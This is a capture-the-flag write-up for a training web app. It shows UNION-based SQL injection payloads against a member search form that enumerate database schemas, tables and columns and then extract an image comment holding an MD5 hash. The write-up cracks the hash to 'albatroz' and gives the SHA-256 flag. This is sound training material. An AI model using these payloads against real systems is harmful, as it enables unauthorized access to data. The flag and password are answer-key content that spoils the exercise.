# SQL Injection 3

The member page `/?page=member` ontains a classic HTTP form to search for a member by their ID.  
We can quickly see that the input is vulnerable to SQL injection:  
If we enter something invalid, like a letter (since IDs can only be numeric), we see an SQL error displayed on the page.  

Let's gather some information about the database:  

- `0 UNION  SELECT SCHEMA_NAME,2 FROM INFORMATION_SCHEMA.SCHEMATA` : This query can give us informations about schematas.  

- `0 UNION  SELECT TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES` : This one about tables.  

- `0 UNION  SELECT COLUMN_NAME,TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS` : This one about columns.  

With all this information, we are able to extract extra informations about the image "Hack me ?" from `Member_images.list_images`

- `0 UNION SELECT title,comment FROM Member_images.list_images`

> If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

The password obtained, 1928e8083cf461a51303633093573c46, is hashed.  
Using a md5 decryption tool, we can retrieve the original password:  
> albatroz

Then, retrieve the real password by following the instructions:  
> albatroz -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188